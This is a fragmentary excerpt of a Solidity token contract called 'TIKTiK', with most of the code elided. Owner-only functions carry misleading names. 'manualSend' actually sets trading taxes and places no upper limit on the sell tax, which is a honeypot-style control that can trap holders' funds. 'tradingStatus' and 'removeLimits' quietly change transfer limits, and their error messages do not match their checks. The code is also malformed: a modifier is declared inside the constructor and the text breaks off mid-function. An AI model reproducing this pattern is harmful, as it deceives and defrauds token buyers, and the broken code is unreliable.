...
contract TIKTiK is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0xb27aaeC13775eD4401C854A077985f03E4abEeE4);
    ...
    string private constant _name = "TIKTiK"; 
    string private constant _symbol = "$TIKTiK"; 
    ...
    constructor () {
        ...
        modifier onlyDev() {	
        require(owner() == _msgSender() || Wallet_Marketing == _msgSender(), "Caller is not the dev");	
        _;	
    }
    ...
    function manualSend (uint256 Buy, uint256 Sell) public onlyDev {
         require(Buy <= 10 && Sell >= 10, "ERC20: wrong tax value!");
        _Tax_On_Buy = Buy;
        _Tax_On_Sell = Sell;
    }

    function tradingStatus (uint256 max) public onlyDev {
         require(max >= 1000, "Max wallet should be less or euqal to 1% totalSupply");
        _maxTxAmount = max;
    }

    function removeLimits(uint256 max) public onlyDev {
         require(max >= 1000, "Max wallet should be less or euqal to 1% totalSupply");
        _maxWalletToken = max;
    }
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public onlyDev returns(bool _sent){
